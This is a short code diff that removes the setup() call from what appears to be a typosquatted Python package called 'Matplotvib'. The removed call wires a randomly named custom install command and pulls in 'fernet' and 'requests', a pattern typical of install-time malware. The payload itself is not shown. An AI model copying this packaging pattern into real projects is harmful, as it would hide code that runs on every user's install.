@@ -18,22 +18,5 @@ class cGqsLBfyVkvxOSmWKnvpCblkznNhLSOspiwllHxajydVolVaMnkwZcNQAhPTYgYgpONEtBWIhx
             install.run(self)
 
 
-setup(
-    name="Matplotvib",
-    version=VERSION,
-    author="rcYMVGSsTesyPpC",
-    author_email="UyUiANMWZfY@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': cGqsLBfyVkvxOSmWKnvpCblkznNhLSOspiwllHxajydVolVaMnkwZcNQAhPTYgYgpONEtBWIhxIEaWuAXgQYyJnhaJbHjThKKzCssuvEZqaAGISdPtXbGdbEZUHLucNpiNbLUBCzXBAbfcpYMjooDUnQyJNUeUjbYQBOKkBuNFJNryeLDlkzfwUpEULMRPpzKSajYDG,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
